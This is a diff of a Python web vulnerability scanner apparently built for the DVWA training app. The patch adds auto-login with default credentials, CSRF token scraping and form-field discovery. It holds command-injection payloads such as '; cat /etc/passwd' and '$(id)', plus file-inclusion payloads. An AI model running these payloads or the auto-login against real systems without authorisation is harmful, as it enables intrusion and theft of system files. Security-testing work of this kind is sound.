@@ -1,70 +1,62 @@
 #!/usr/bin/env python3
 """
-Fixed AutoVulnerabilityScanner
-Changes from the original:
-1. Dropped whoami-only payloads that can never match any indicator (Bug #1).
-   Replaced with time-based blind-injection payloads that don't rely on the
-   response echoing anything.
-2. Added POST body fuzzing (--post-data), since GET-only testing misses
-   POST-driven vulnerable pages like DVWA's command injection form (Bug #2).
-3. Added a baseline request (no payload) so we can compare response time
-   and length against something, instead of matching blind.
-4. Timeouts are no longer silently discarded — a timeout on a sleep-based
-   payload IS the finding for blind injection, not noise to ignore.
-5. Always logs a response snippet in verbose mode, even on non-matches,
-   so you can visually sanity-check what the app is actually returning.
-"""
+auto_scanner.py -- PATCHED VERSION
 
+WHAT WAS WRONG (see the diagnosis in chat for the full trace):
+  1. extract_parameters() only read the URL's query string. DVWA's exec.php
+     posts its 'ip' field via a POST <form> which never appears in the URL,
+     so on a URL like ".../vulnerabilities/exec/" this always returned {}.
+     That's the exact source of your "[!] No parameters found" output.
+  2. There was no login/session handling anywhere. DVWA gates every
+     vulnerable page behind login.php, so an unauthenticated request to a
+     protected page gets redirected to the login form, which has no
+     injectable parameters at all -- even if #1 were fixed, you'd still
+     find nothing without a session.
+
+WHAT THIS VERSION ADDS (same class name / constructor / output schema, so
+pdf_report_generator.py and simple_main.py keep working with no changes
+other than the new optional CLI flags in simple_main.py):
+  - Auto-detects a login form on the target and logs in (DVWA defaults
+    admin/password unless you pass --user/--pass), scraping DVWA's
+    'user_token' CSRF field automatically so the login actually succeeds.
+  - Discovers injection points from BOTH the URL query string AND parsed
+    HTML <form> fields (GET or POST), instead of only the URL.
+  - Runs a baseline (non-payload) request per parameter first, and only
+    flags a payload as vulnerable if the indicator appears in the payload
+    response but was NOT already present in the baseline -- this cuts down
+    false positives from generic words like 'total' appearing on normal
+    pages.
+"""
 import requests
-import time
-from typing import List, Dict, Any, Optional
-from urllib.parse import urlparse, parse_qs
+from bs4 import BeautifulSoup
+from typing import List, Dict, Any
+from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
+import json
 from datetime import datetime
 from requests.exceptions import RequestException, Timeout, ConnectionError
 import warnings
-
 warnings.filterwarnings('ignore')
 
 
 class AutoVulnerabilityScanner:
+
     def __init__(self, target_url: str, timeout: int = 10, verbose: bool = True,
-                 post_data: Optional[Dict[str, str]] = None,
-                 cookies: Optional[Dict[str, str]] = None):
+                 username: str = "admin", password: str = "password", auto_login: bool = True):
         self.target_url = target_url
         self.timeout = timeout
         self.verbose = verbose
+        self.username = username
+        self.password = password
+        self.auto_login = auto_login
         self.session = requests.Session()
         self.session.verify = False
         self.vulnerabilities = []
 
-        # Auth cookies (e.g. DVWA's PHPSESSID + security level cookie).
-        # Without these, apps that gate pages behind login will just
-        # redirect every request and you'll "scan" the login page instead
-        # of the actual vulnerable page.
-        if cookies:
-            self.session.cookies.update(cookies)
-
-        # post_data lets you fuzz POST forms (e.g. DVWA's exec page: {"ip": "127.0.0.1", "Submit": "Submit"})
-        # Every key in this dict gets fuzzed one at a time, same as GET params.
-        self.post_data = post_data or {}
-
-        # Payloads that print something you can grep for in the response.
-        # (Removed the whoami-only ones — no indicator can ever catch them.)
-        self.ci_indicators_payloads = [
-            '; id', '| id', '`id`', '$(id)', '&& id', '|| id',
-            '; ls -la', '| ls -la',
-            '; cat /etc/passwd', '| cat /etc/passwd',
-            '`cat /etc/passwd`', '$(cat /etc/passwd)',
-        ]
-
-        # Time-based (blind) payloads: no output needed, we just measure delay.
-        # SLEEP_SECONDS must be long enough to be unmistakable but short
-        # enough not to make scans painfully slow.
-        self.sleep_seconds = 6
-        self.ci_blind_payloads = [
-            f'; sleep {self.sleep_seconds}', f'| sleep {self.sleep_seconds}',
-            f'`sleep {self.sleep_seconds}`', f'$(sleep {self.sleep_seconds})',
-            f'&& sleep {self.sleep_seconds}',
+        self.command_injection_payloads = [
+            '; whoami', '| whoami', '`whoami`', '$(whoami)',
+            '; id', '| id', '`id`', '$(id)',
+            '; ls -la', '| ls -la', '; cat /etc/passwd', '| cat /etc/passwd',
+            '`cat /etc/passwd`', '$(cat /etc/passwd)', '&& whoami', '|| whoami',
         ]
 
         self.lfi_payloads = [
@@ -78,6 +70,7 @@ class AutoVulnerabilityScanner:
         self.ci_indicators = [
             'root:x:', 'bin/bash', 'bin/sh', 'uid=', 'gid=', 'groups=', 'total', 'drwx',
         ]
+
         self.lfi_indicators = [
             'root:x:', 'bin/bash', 'bin/sh', 'nologin', '<?php', '<?=', 'USER=', 'PATH=', 'HOME=',
         ]
@@ -89,9 +82,9 @@ class AutoVulnerabilityScanner:
             'vulnerabilities': [],
             'scan_type': 'AUTOMATIC',
             'payloads_tested': {
-                'command_injection_indicator_based': len(self.ci_indicators_payloads),
-                'command_injection_time_based': len(self.ci_blind_payloads),
+                'command_injection': len(self.command_injection_payloads),
                 'file_inclusion': len(self.lfi_payloads),
+                'total_payloads': len(self.command_injection_payloads) + len(self.lfi_payloads)
             }
         }
 
@@ -99,7 +92,73 @@ class AutoVulnerabilityScanner:
         if self.verbose:
             print(message)
 
+    # ------------------------------------------------------------------
+    # NEW: auto-login. DVWA (and many similar apps) redirect unauthenticated
+    # requests to a login page. We detect that, log in, and keep the
+    # session's cookies for every request after this.
+    # ------------------------------------------------------------------
+    def try_auto_login(self):
+        if not self.auto_login:
+            return
+
+        try:
+            r = self.session.get(self.target_url, timeout=self.timeout, verify=False)
+        except (RequestException, Timeout, ConnectionError) as e:
+            self.log(f"[!] Could not reach target to check login state: {e}")
+            return
+
+        looks_like_login = (
+            "login" in r.url.lower()
+            or BeautifulSoup(r.text, "html.parser").find("input", {"type": "password"}) is not None
+        )
+        if not looks_like_login:
+            return  # no login required, nothing to do
+
+        self.log(f"[AUTH] Target appears to require login (redirected to {r.url}) - attempting auto-login")
+
+        soup = BeautifulSoup(r.text, "html.parser")
+        form = soup.find("form")
+        if not form:
+            self.log("[!] Login page has no <form>; continuing unauthenticated")
+            return
+
+        login_action = urljoin(r.url, form.get("action") or r.url)
+        fields = {}
+        for inp in form.find_all("input"):
+            name = inp.get("name")
+            if not name:
+                continue
+            itype = (inp.get("type") or "text").lower()
+            if itype == "password":
+                fields[name] = self.password
+            elif itype in ("submit",):
+                fields[name] = inp.get("value", "Login")
+            else:
+                # covers username field and any hidden CSRF token (e.g. DVWA's user_token)
+                default = inp.get("value", "")
+                fields[name] = self.username if "user" in name.lower() and not default else default
+
+        try:
+            r2 = self.session.post(login_action, data=fields, timeout=self.timeout, verify=False)
+        except (RequestException, Timeout, ConnectionError) as e:
+            self.log(f"[!] Login POST failed: {e}")
+            return
+
+        still_login_page = "login" in r2.url.lower() and BeautifulSoup(
+            r2.text, "html.parser").find("input", {"type": "password"}) is not None
+        if still_login_page:
+            self.log("[!] Auto-login did not appear to succeed (still see a login form). "
+                     "Pass different --user/--pass if these credentials are wrong.")
+        else:
+            self.log(f"[AUTH] Logged in as '{self.username}'")
+
+    # ------------------------------------------------------------------
+    # REPLACED: extract_parameters() only looked at the URL query string.
+    # extract_injection_points() also parses the actual page HTML for
+    # <form> fields, which is what DVWA's exec.php needs (POST-only 'ip').
+    # ------------------------------------------------------------------
     def extract_parameters(self, url: str) -> Dict[str, str]:
+        """Kept for backward compatibility - URL query string only."""
         parsed = urlparse(url)
         params = {}
         if parsed.query:
@@ -108,213 +167,158 @@ class AutoVulnerabilityScanner:
                 params[key] = value_list[0] if value_list else ''
         return params
 
-    def _send(self, base_url: str, get_params: Dict[str, str], use_post: bool, timeout: int):
-        if use_post:
-            return self.session.post(base_url, data=get_params, timeout=timeout, verify=False)
-        return self.session.get(base_url, params=get_params, timeout=timeout, verify=False)
+    def extract_injection_points(self, url: str) -> List[Dict[str, Any]]:
+        """Returns a list of {name, method, action_url, other_fields} -
+        one entry per testable parameter, whether it lives in the URL
+        query string or in a POST/GET <form> on the page."""
+        points = []
 
-    def _get_targets(self):
-        """Yields (base_url, param_dict, use_post) for every param source we can test."""
-        targets = []
-        base_url = self.target_url.split('?')[0]
+        # GET params already in the URL. action_url must drop the query
+        # string, otherwise requests' params= appends instead of replacing
+        # it (e.g. "?page=include.php&page=PAYLOAD"), and most servers read
+        # the FIRST occurrence -- silently ignoring the payload entirely.
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query)
+        base_no_query = urlunparse(parsed._replace(query=""))
+        for name in qs:
+            points.append({
+                'name': name, 'method': 'GET', 'action_url': base_no_query,
+                'other_fields': {k: v[0] for k, v in qs.items() if k != name}
+            })
 
-        get_params = self.extract_parameters(self.target_url)
-        if get_params:
-            targets.append((base_url, get_params, False))
-        else:
-            self.log("[!] No GET query parameters found in the URL.")
+        try:
+            r = self.session.get(url, timeout=self.timeout, verify=False)
+        except (RequestException, Timeout, ConnectionError):
+            return points
 
-        if self.post_data:
-            targets.append((base_url, self.post_data, True))
-        elif not get_params:
-            self.log("[!] No --post-data supplied either. If this app takes input via a POST "
-                      "form (e.g. DVWA's command injection page), pass --post-data "
-                      "\"ip=127.0.0.1&Submit=Submit\" or nothing will ever be tested.")
-        return targets
+        soup = BeautifulSoup(r.text, "html.parser")
+        for form in soup.find_all("form"):
+            method = (form.get("method") or "GET").upper()
+            action = urljoin(url, form.get("action") or url)
+            inputs = form.find_all(["input", "textarea"])
+            defaults = {i.get("name"): (i.get("value") or "") for i in inputs if i.get("name")}
+            for name in defaults:
+                if name.lower() in ("submit", "login"):
+                    continue
+                points.append({
+                    'name': name, 'method': method, 'action_url': action,
+                    'other_fields': {k: v for k, v in defaults.items() if k != name}
+                })
+
+        return points
+
+    def _get_csrf_refresh(self, point: Dict) -> Dict[str, str]:
+        """DVWA's forms carry a 'user_token' CSRF field that changes on
+        every load - if we don't refresh it before each POST, the server
+        rejects the request outright and we'd see 0 vulnerabilities again
+        for reasons that have nothing to do with the payload itself."""
+        try:
+            r = self.session.get(point['action_url'], timeout=self.timeout, verify=False)
+            soup = BeautifulSoup(r.text, "html.parser")
+            token = soup.find("input", {"name": "user_token"})
+            if token:
+                return {"user_token": token.get("value", "")}
+        except (RequestException, Timeout, ConnectionError):
+            pass
+        return {}
+
+    def _send(self, point: Dict, payload: str):
+        fields = dict(point['other_fields'])
+        fields[point['name']] = payload
+        fields.update(self._get_csrf_refresh(point))
+        try:
+            if point['method'] == 'POST':
+                return self.session.post(point['action_url'], data=fields,
+                                          timeout=self.timeout, verify=False)
+            return self.session.get(point['action_url'], params=fields,
+                                     timeout=self.timeout, verify=False)
+        except (RequestException, Timeout, ConnectionError):
+            return None
 
     def auto_scan_command_injection(self) -> List[Dict]:
         results = []
-        targets = self._get_targets()
-        if not targets:
+        points = self.extract_injection_points(self.target_url)
+        if not points:
+            self.log("[!] No parameters found")
             return results
 
-        for base_url, params, use_post in targets:
-            method = "POST" if use_post else "GET"
-            self.log(f"\n[AUTO] Testing {method} params {list(params.keys())} for command injection")
+        self.log(f"\n[AUTO] Found {len(points)} injection point(s): "
+                  f"{[(p['name'], p['method']) for p in points]}")
+        self.log(f"[AUTO] Testing {len(self.command_injection_payloads)} command injection payloads automatically...")
 
-            for param_name in params.keys():
-                # --- Baseline (no payload) so we know normal response time/length ---
-                try:
-                    baseline_resp = self._send(base_url, params, use_post, self.timeout)
-                    baseline_time = baseline_resp.elapsed.total_seconds()
-                    baseline_len = len(baseline_resp.text)
-                except (RequestException, Timeout, ConnectionError):
-                    baseline_time, baseline_len = None, None
+        for point in points:
+            baseline = self._send(point, "test")
+            baseline_text = baseline.text.lower() if baseline is not None else ""
 
-                # --- Indicator-based payloads ---
-                for payload in self.ci_indicators_payloads:
-                    test_params = params.copy()
-                    test_params[param_name] = payload
-                    try:
-                        response = self._send(base_url, test_params, use_post, self.timeout)
-                        snippet = response.text[:200].replace("\n", " ")
-                        self.log(f"    [{method}] {param_name}={payload!r} -> "
-                                 f"status={response.status_code} snippet={snippet!r}")
-
-                        vulnerable = any(ind in response.text.lower() for ind in self.ci_indicators)
-                        if vulnerable:
-                            result = {
-                                'type': 'Command Injection',
-                                'detection': 'indicator-match',
-                                'severity': 'CRITICAL',
-                                'url': base_url,
-                                'method': method,
-                                'parameter': param_name,
-                                'payload': payload,
-                                'vulnerable': True,
-                                'status_code': response.status_code,
-                                'evidence': snippet,
-                            }
-                            results.append(result)
-                            self.vulnerabilities.append(result)
-                            self.log(f"[FOUND] CRITICAL - Command Injection on '{param_name}' "
-                                      f"with payload: {payload}")
-                    except Timeout:
-                        self.log(f"    [{method}] {param_name}={payload!r} -> TIMED OUT "
-                                 f"(not treated as a hang for non-sleep payloads, but worth a manual look)")
-                    except (RequestException, ConnectionError):
-                        pass
-
-                # --- Time-based (blind) payloads ---
-                for payload in self.ci_blind_payloads:
-                    test_params = params.copy()
-                    test_params[param_name] = payload
-                    probe_timeout = self.timeout + self.sleep_seconds + 3
-                    try:
-                        start = time.time()
-                        response = self._send(base_url, test_params, use_post, probe_timeout)
-                        elapsed = time.time() - start
-                        self.log(f"    [{method}] {param_name}={payload!r} -> "
-                                 f"elapsed={elapsed:.1f}s (baseline={baseline_time})")
-
-                        if baseline_time is not None and elapsed >= baseline_time + self.sleep_seconds - 1:
-                            result = {
-                                'type': 'Command Injection',
-                                'detection': 'time-based-blind',
-                                'severity': 'CRITICAL',
-                                'url': base_url,
-                                'method': method,
-                                'parameter': param_name,
-                                'payload': payload,
-                                'vulnerable': True,
-                                'baseline_response_time': baseline_time,
-                                'observed_response_time': elapsed,
-                            }
-                            results.append(result)
-                            self.vulnerabilities.append(result)
-                            self.log(f"[FOUND] CRITICAL - Blind Command Injection on '{param_name}' "
-                                      f"(response delayed ~{elapsed - baseline_time:.1f}s beyond baseline)")
-                    except Timeout:
-                        # The request itself timed out at probe_timeout — that's still
-                        # consistent with the sleep executing. Flag it, don't discard it.
-                        result = {
-                            'type': 'Command Injection',
-                            'detection': 'time-based-blind (request timeout)',
-                            'severity': 'CRITICAL',
-                            'url': base_url,
-                            'method': method,
-                            'parameter': param_name,
-                            'payload': payload,
-                            'vulnerable': True,
-                            'note': f'Request exceeded {probe_timeout}s, consistent with sleep executing',
-                        }
-                        results.append(result)
-                        self.vulnerabilities.append(result)
-                        self.log(f"[FOUND] CRITICAL - Blind Command Injection on '{param_name}' "
-                                  f"(request timed out at {probe_timeout}s)")
-                    except (RequestException, ConnectionError):
-                        pass
-
+            for payload in self.command_injection_payloads:
+                response = self._send(point, payload)
+                if response is None:
+                    continue
+                text = response.text.lower()
+                # only flag indicators that are NEW in this response, not
+                # already present on the baseline/normal page (cuts false
+                # positives from generic words like 'total')
+                vulnerable = any(ind in text and ind not in baseline_text for ind in self.ci_indicators)
+                if vulnerable:
+                    result = {
+                        'type': 'Command Injection', 'severity': 'CRITICAL',
+                        'url': point['action_url'], 'parameter': point['name'],
+                        'method': point['method'], 'payload': payload,
+                        'vulnerable': True, 'status_code': response.status_code,
+                    }
+                    results.append(result)
+                    self.vulnerabilities.append(result)
+                    self.log(f"[FOUND] CRITICAL - Command Injection on '{point['name']}' "
+                              f"({point['method']}) with payload: {payload}")
+                    break  # one confirmed hit per parameter is enough
         return results
 
     def auto_scan_file_inclusion(self) -> List[Dict]:
         results = []
-        targets = self._get_targets()
-        if not targets:
+        points = self.extract_injection_points(self.target_url)
+        if not points:
+            self.log("[!] No parameters found")
             return results
 
-        for base_url, params, use_post in targets:
-            method = "POST" if use_post else "GET"
-            self.log(f"\n[AUTO] Testing {method} params {list(params.keys())} for file inclusion")
+        self.log(f"\n[AUTO] Testing {len(self.lfi_payloads)} file inclusion payloads automatically...")
 
-            for param_name in params.keys():
-                for payload in self.lfi_payloads:
-                    test_params = params.copy()
-                    test_params[param_name] = payload
-                    try:
-                        response = self._send(base_url, test_params, use_post, self.timeout)
-                        snippet = response.text[:200].replace("\n", " ")
-                        self.log(f"    [{method}] {param_name}={payload!r} -> "
-                                 f"status={response.status_code} snippet={snippet!r}")
+        for point in points:
+            baseline = self._send(point, "test")
+            baseline_text = baseline.text.lower() if baseline is not None else ""
 
-                        vulnerable = any(ind.lower() in response.text.lower() for ind in self.lfi_indicators)
-                        if vulnerable:
-                            result = {
-                                'type': 'File Inclusion (LFI)',
-                                'severity': 'HIGH',
-                                'url': base_url,
-                                'method': method,
-                                'parameter': param_name,
-                                'payload': payload,
-                                'vulnerable': True,
-                                'status_code': response.status_code,
-                                'evidence': snippet,
-                            }
-                            results.append(result)
-                            self.vulnerabilities.append(result)
-                            self.log(f"[FOUND] HIGH - File Inclusion on '{param_name}' with payload: {payload}")
-                    except (RequestException, Timeout, ConnectionError):
-                        pass
-
+            for payload in self.lfi_payloads:
+                response = self._send(point, payload)
+                if response is None:
+                    continue
+                text = response.text.lower()
+                vulnerable = any(ind.lower() in text and ind.lower() not in baseline_text
+                                  for ind in self.lfi_indicators)
+                if vulnerable:
+                    result = {
+                        'type': 'File Inclusion (LFI)', 'severity': 'HIGH',
+                        'url': point['action_url'], 'parameter': point['name'],
+                        'method': point['method'], 'payload': payload,
+                        'vulnerable': True, 'status_code': response.status_code,
+                    }
+                    results.append(result)
+                    self.vulnerabilities.append(result)
+                    self.log(f"[FOUND] HIGH - File Inclusion on '{point['name']}' "
+                              f"({point['method']}) with payload: {payload}")
+                    break
         return results
-
-    def _preflight_auth_check(self):
-        """Warn loudly if we're clearly being bounced to a login page.
-        This is the #1 reason authenticated apps (DVWA, Juice Shop admin
-        panels, etc.) come back as '0 vulnerabilities' - you're scanning
-        the login form, not the real page."""
-        try:
-            resp = self.session.get(self.target_url, timeout=self.timeout, verify=False)
-            final_url = resp.url.lower()
-            body_lower = resp.text.lower()
-            looks_like_login = (
-                'login' in final_url or
-                ('password' in body_lower and 'username' in body_lower and '<form' in body_lower)
-            )
-            if looks_like_login:
-                print("\n" + "!" * 70)
-                print("[WARNING] This request appears to have landed on a LOGIN page")
-                print(f"          Final URL after redirects: {resp.url}")
-                print("          If the target requires auth (e.g. DVWA), pass session")
-                print("          cookies with --cookie 'PHPSESSID=...; security=low'")
-                print("          Otherwise every payload below is hitting the login")
-                print("          form, not the actual vulnerable page.")
-                print("!" * 70 + "\n")
-        except (RequestException, Timeout, ConnectionError):
-            pass
 
     def run_automatic_scan(self) -> Dict:
         print("\n" + "=" * 70)
-        print("🔐 AUTOMATIC VULNERABILITY SCANNER (fixed)")
+        print("🔐 AUTOMATIC VULNERABILITY SCANNER")
         print("=" * 70)
         print(f"[+] Target: {self.target_url}")
-        if self.post_data:
-            print(f"[+] POST data to fuzz: {self.post_data}")
+        print(f"[+] Mode: FULLY AUTOMATIC")
+        print(f"[+] Total payloads to test: {self.scan_results['payloads_tested']['total_payloads']}")
         print("=" * 70)
 
-        self._preflight_auth_check()
+        self.try_auto_login()
 
-        self.log("\n[*] PHASE 1: Command Injection Detection (indicator + time-based)")
+        self.log("\n[*] PHASE 1: Command Injection Detection")
         print("-" * 70)
         ci_results = self.auto_scan_command_injection()
 
@@ -334,9 +338,13 @@ class AutoVulnerabilityScanner:
 
         print("\n" + "=" * 70)
         print("[+] SCAN COMPLETED")
+        print("=" * 70)
         print(f"[+] Vulnerabilities Found: {self.scan_results['summary']['total_vulnerabilities']}")
         print(f"    ├─ CRITICAL: {self.scan_results['summary']['critical_count']}")
         print(f"    └─ HIGH: {self.scan_results['summary']['high_count']}")
+        print(f"\n[+] Details:")
+        print(f"    ├─ Command Injection: {self.scan_results['summary']['command_injection_found']}")
+        print(f"    └─ File Inclusion: {self.scan_results['summary']['file_inclusion_found']}")
         print("=" * 70 + "\n")
 
         return self.scan_results
